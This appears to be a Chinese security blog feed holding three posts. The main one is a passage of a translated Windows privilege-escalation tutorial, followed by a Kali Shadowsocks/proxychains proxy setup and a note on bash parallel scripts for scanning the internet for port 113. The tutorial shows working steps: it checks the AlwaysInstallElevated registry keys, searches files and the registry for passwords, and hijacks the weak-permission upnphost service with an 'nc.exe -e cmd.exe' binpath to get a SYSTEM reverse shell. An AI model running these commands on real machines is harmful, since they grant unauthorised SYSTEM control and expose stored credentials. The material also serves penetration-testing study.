<h4 id="接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。"><a href="#接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。" class="headerlink" title="接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。"></a>接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。</h4><h4 id="为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。"><a href="#为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。" class="headerlink" title="为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。"></a>为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
<h4 id="最后我们也可能通过下面的命令来挖到未知的宝藏"><a href="#最后我们也可能通过下面的命令来挖到未知的宝藏" class="headerlink" title="最后我们也可能通过下面的命令来挖到未知的宝藏"></a>最后我们也可能通过下面的命令来挖到未知的宝藏</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># The command below will search the file system for file names containing certain keywords. You can</div><div class="line">specify as many keywords as you wish.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Search certain file types for a keyword, this can generate a lot of output.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt</div><div class="line"></div><div class="line"># Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s</div><div class="line">C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</div></pre></td></tr></table></figure>
<h2 id="Δt-for-t7-to-t10-Roll-Up-Your-Sleeves"><a href="#Δt-for-t7-to-t10-Roll-Up-Your-Sleeves" class="headerlink" title="Δt for t7 to t10 - Roll Up Your Sleeves"></a>Δt for t7 to t10 - Roll Up Your Sleeves</h2><h4 id="希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统"><a href="#希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统" class="headerlink" title="希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统"></a>希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统</h4><h4 id="接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集"><a href="#接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集" class="headerlink" title="接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里下载这个工具集"></a>接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里<a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="external">下载这个工具集</a></h4><h4 id="接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。"><a href="#接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。" class="headerlink" title="接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。"></a>接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># We can use sc to query, configure and manage windows services.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; sc qc Spooler</div><div class="line"></div><div class="line">[SC] QueryServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: Spooler</div><div class="line">        TYPE               : 110  WIN32_OWN_PROCESS (interactive)</div><div class="line">        START_TYPE         : 2   AUTO_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe</div><div class="line">        LOAD_ORDER_GROUP   : SpoolerGroup</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Print Spooler</div><div class="line">        DEPENDENCIES       : RPCSS</div><div class="line">                           : http</div><div class="line">        SERVICE_START_NAME : LocalSystem</div></pre></td></tr></table></figure>
<h4 id="我们也可以使用accesschk-来检查每个服务的权限级别"><a href="#我们也可以使用accesschk-来检查每个服务的权限级别" class="headerlink" title="我们也可以使用accesschk 来检查每个服务的权限级别"></a>我们也可以使用accesschk 来检查每个服务的权限级别</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"># We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list</div><div class="line">all services.</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -ucqv Spooler</div><div class="line"></div><div class="line">Spooler</div><div class="line"></div><div class="line">  R  NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_QUERY_STATUS</div><div class="line">        SERVICE_QUERY_CONFIG</div><div class="line">        SERVICE_INTERROGATE</div><div class="line">        SERVICE_ENUMERATE_DEPENDENTS</div><div class="line">        SERVICE_USER_DEFINED_CONTROL</div><div class="line">        READ_CONTROL</div><div class="line">  R  BUILTIN\Power Users</div><div class="line">        SERVICE_QUERY_STATUS</div><div class="line">        SERVICE_QUERY_CONFIG</div><div class="line">        SERVICE_INTERROGATE</div><div class="line">        SERVICE_ENUMERATE_DEPENDENTS</div><div class="line">        SERVICE_START</div><div class="line">        SERVICE_USER_DEFINED_CONTROL</div><div class="line">        READ_CONTROL</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div></pre></td></tr></table></figure>
<h4 id="Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。"><a href="#Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。" class="headerlink" title="Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。"></a>Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。</h4><h4 id="咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同"><a href="#咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同" class="headerlink" title="咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,"></a>咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"># This is on Windows 8.</div><div class="line"></div><div class="line">C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</div><div class="line">No matching objects found.</div><div class="line"></div><div class="line"># On a default Windows XP SP0 we can see there is a pretty big security fail.</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</div><div class="line">RW SSDPSRV</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">RW upnphost</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">		</div><div class="line">C:\&gt; accesschk.exe -ucqv SSDPSRV</div><div class="line"></div><div class="line">SSDPSRV</div><div class="line"></div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Power Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\LOCAL SERVICE</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -ucqv upnphost</div><div class="line"></div><div class="line">upnphost</div><div class="line"></div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Power Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\LOCAL SERVICE</div><div class="line">        SERVICE_ALL_ACCESS</div></pre></td></tr></table></figure>
<h4 id="通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell"><a href="#通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell" class="headerlink" title="通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell"></a>通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">C:\&gt; sc qc upnphost</div><div class="line"></div><div class="line">[SC] GetServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: upnphost</div><div class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</div><div class="line">        START_TYPE         : 3   DEMAND_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</div><div class="line">        LOAD_ORDER_GROUP   :</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div class="line">        DEPENDENCIES       : SSDPSRV</div><div class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</div><div class="line">		</div><div class="line">C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</div><div class="line">[SC] ChangeServiceConfig SUCCESS</div><div class="line"></div><div class="line">C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</div><div class="line">[SC] ChangeServiceConfig SUCCESS</div><div class="line"></div><div class="line">C:\&gt; sc qc upnphost</div><div class="line"></div><div class="line">[SC] GetServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: upnphost</div><div class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</div><div class="line">        START_TYPE         : 3   DEMAND_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</div><div class="line">        LOAD_ORDER_GROUP   :</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div class="line">        DEPENDENCIES       : SSDPSRV</div><div class="line">        SERVICE_START_NAME : LocalSystem</div><div class="line">		</div><div class="line">C:\&gt; net start upnphost</div></pre></td></tr></table></figure>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410151231_nF2KHi_Screenshot.jpeg" alt=""></p>
<h4 id="下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell"><a href="#下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell" class="headerlink" title="下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell."></a>下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell.</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv02_big.png" alt=""></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><h4 id="以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"><a href="#以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！" class="headerlink" title="以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"></a>以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[kali 代理之shadowsocks & proxychains]]></title>
      <url>/2018/03/30/kali-%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks-proxychains/</url>
      <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"><a href="#emsp-emsp-最近和朋友合租了一台vps-，我搭好ss-bbr-之后居然不知道如何给kali-配置代理，真是可耻，果然Mac-用惯了之后人都会变懒！找了很久发现好多关于kali-代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！" class="headerlink" title="&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了这篇文章，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！"></a>&emsp;&emsp;最近和朋友合租了一台vps ，我搭好ss + bbr 之后居然不知道如何给kali 配置代理，真是可耻，果然Mac 用惯了之后人都会变懒！找了很久发现好多关于kali 代理的文章都失效，不过我还是在网上找到了<a href="https://blog.csdn.net/qq_27766969/article/details/71593611" target="_blank" rel="external">这篇文章</a>，虽然上面的配置过程有些细微的错误，不过大致照着他的配置是没问题的！</h4><a id="more"></a>
<h2 id="0x01-代理流程"><a href="#0x01-代理流程" class="headerlink" title="0x01. 代理流程"></a>0x01. 代理流程</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330161820_C3BORx_Screenshot.jpeg" alt=""></p>
<h4 id="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"><a href="#好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！" class="headerlink" title="好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！"></a>好多人都用过代理，但可能大部分却都不太了解代理是如何工作的，我在这里给大家简单介绍一下，不涉及底层知识，相信很容易理解！</h4><ul>
<li>首先通过proxychains 将本地流量发往localhost 的 1080 端口</li>
<li>localhost 的1080 端口和VPS 的8080 端口通过shadowsocks 建立 ss 连接</li>
<li>本地流量 -&gt; localhost 1080 -&gt; VPS 8080 -&gt; 目标站点</li>
</ul>
<h4 id="以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"><a href="#以上就是ss-代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置" class="headerlink" title="以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置"></a>以上就是ss 代理的流程，是不是感觉很简单，下面我给大家演示一下如何配置</h4><h2 id="0x02-配置-proxychains"><a href="#0x02-配置-proxychains" class="headerlink" title="0x02. 配置 proxychains"></a>0x02. 配置 proxychains</h2><blockquote>
<p>vim /etc/proxychains.conf</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330163334_xF5VwI_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-配置shadowsocks"><a href="#0x03-配置shadowsocks" class="headerlink" title="0x03. 配置shadowsocks"></a>0x03. 配置shadowsocks</h2><h4 id="1-安装shadowsocks"><a href="#1-安装shadowsocks" class="headerlink" title="1. 安装shadowsocks"></a>1. 安装shadowsocks</h4><blockquote>
<p>apt-get install python-pip &amp;&amp; pip install shadowsocks</p>
</blockquote>
<h4 id="2-优化shadowsocks-，这里我也不懂优化策略"><a href="#2-优化shadowsocks-，这里我也不懂优化策略" class="headerlink" title="2. 优化shadowsocks ，这里我也不懂优化策略"></a>2. 优化shadowsocks ，这里我也不懂优化策略</h4><blockquote>
<p>vim  /etc/sysctl.d/local.conf</p>
<p>sysctl –system  &emsp; # 优化文件保存之后执行这条命令生效 </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"># max open files</div><div class="line">fs.file-max = 51200  </div><div class="line"># max read buffer</div><div class="line">net.core.rmem_max = 67108864  </div><div class="line"># max write buffer</div><div class="line">net.core.wmem_max = 67108864  </div><div class="line"># default read buffer</div><div class="line">net.core.rmem_default = 65536  </div><div class="line"># default write buffer</div><div class="line">net.core.wmem_default = 65536  </div><div class="line"># max processor input queue</div><div class="line">net.core.netdev_max_backlog = 4096  </div><div class="line"># max backlog</div><div class="line">net.core.somaxconn = 4096</div><div class="line"></div><div class="line"># resist SYN flood attacks</div><div class="line">net.ipv4.tcp_syncookies = 1  </div><div class="line"># reuse timewait sockets when safe</div><div class="line">net.ipv4.tcp_tw_reuse = 1  </div><div class="line"># turn off fast timewait sockets recycling</div><div class="line">net.ipv4.tcp_tw_recycle = 0  </div><div class="line"># short FIN timeout</div><div class="line">net.ipv4.tcp_fin_timeout = 30  </div><div class="line"># short keepalive time</div><div class="line">net.ipv4.tcp_keepalive_time = 1200  </div><div class="line"># outbound port range</div><div class="line">net.ipv4.ip_local_port_range = 10000 65000  </div><div class="line"># max SYN backlog</div><div class="line">net.ipv4.tcp_max_syn_backlog = 4096  </div><div class="line"># max timewait sockets held by system simultaneously</div><div class="line">net.ipv4.tcp_max_tw_buckets = 5000  </div><div class="line"># turn on TCP Fast Open on both client and server side</div><div class="line">net.ipv4.tcp_fastopen = 3  </div><div class="line"># TCP receive buffer</div><div class="line">net.ipv4.tcp_rmem = 4096 87380 67108864  </div><div class="line"># TCP write buffer</div><div class="line">net.ipv4.tcp_wmem = 4096 65536 67108864  </div><div class="line"># turn on path MTU discovery</div><div class="line">net.ipv4.tcp_mtu_probing = 1</div><div class="line"></div><div class="line"># for high-latency network</div><div class="line">net.ipv4.tcp_congestion_control = hybla</div><div class="line"></div><div class="line"># for low-latency network, use cubic instead</div><div class="line"># net.ipv4.tcp_congestion_control = cubic</div></pre></td></tr></table></figure>
<h4 id="3-配置Shadowsocks配置文件"><a href="#3-配置Shadowsocks配置文件" class="headerlink" title="3. 配置Shadowsocks配置文件"></a>3. 配置Shadowsocks配置文件</h4><blockquote>
<p>mkdir /root/ss &amp;&amp; cd /root/ss &amp;&amp; vim ssserver.json</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&#123;</div><div class="line">    &quot;server&quot;: &quot;my_server_ip&quot;, // 这里输入墙外服务器地址</div><div class="line">    &quot;server_port&quot;: 8080, // 墙外服务器的端口</div><div class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class="line">    &quot;local_port&quot;: 1080, // 为了安全，可修改为大于 1024 的数字</div><div class="line">    &quot;password&quot;: &quot;mypassword&quot;, // 设置一个密码</div><div class="line">    &quot;timeout&quot;: 300,</div><div class="line">    &quot;method&quot;: &quot;aes-256-cfb&quot;,//要和服务端的加密方式相同</div><div class="line">    &quot;fast_open&quot;: false</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="4-修改-python-配置文件，不然运行不了-ss"><a href="#4-修改-python-配置文件，不然运行不了-ss" class="headerlink" title="4. 修改 python 配置文件，不然运行不了 ss"></a>4. 修改 python 配置文件，不然运行不了 ss</h4><blockquote>
<p>vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py &emsp; # 修改成如下所示</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330164846_7aMRN6_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165005_QFOnfG_Screenshot.jpeg" alt=""></p>
<h4 id="5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可"><a href="#5-现在可以启动-ss-使用代理，在要使用代理的应用前加proxychains-即可" class="headerlink" title="5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可"></a>5. 现在可以启动 ss 使用代理，在要使用代理的应用前加proxychains 即可</h4><blockquote>
<p>sslocal -c /root/ss/ssserver.json -d start &emsp; # 重启之后需要再次运行该命令启动 ss</p>
<p>proxychains curl ip.cn</p>
<p>proxychains firefox</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165447_bwVCOz_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BB%A3%E7%90%86%E4%B9%8Bshadowsocks_proxychains/20180330165823_L4SdgT_Screenshot.jpeg" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[bash 伪多进程]]></title>
      <url>/2018/03/28/bash-%E4%BC%AA%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！"><a href="#emsp-emsp-最近研究ident-user-enum-这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113-端口的主机，然而互联网实在是太大了，但是开着113-端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！" class="headerlink" title="&emsp;&emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！"></a>&emsp;&emsp;最近研究ident-user-enum 这个工具的时候我不知道如何配置实验环境，所以打算在公网上找开着113 端口的主机，然而互联网实在是太大了，但是开着113 端口的主机是真的少之又少，如果用单进程一个一个试的话无疑大海捞针，所以今天打算将自己写脚本的心得总结一下，其实也很简单！</h4><a id="more"></a>
<h2 id="0x01-脚本分析"><a href="#0x01-脚本分析" class="headerlink" title="0x01. 脚本分析"></a>0x01. 脚本分析</h2><blockquote>
<ol>
<li>首先我用了两个for 循环进行嵌套，然后用了&amp;&emsp;wait 来开设伪进程，就相当于里层循环正常执行，但是外层循环会被置于后台，这样我们相当于同时开了三个进程来进行里层循环，所以总共需要9 s 来运行整个脚本，而不是27 s 当然你也可以将里层循环也开启伪进程，不过后面扫公网时我不希望自己开的进程达到数万个，所以我这里没有加</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180314170109_LlEaRr_Screenshot.jpeg" alt=""></p>
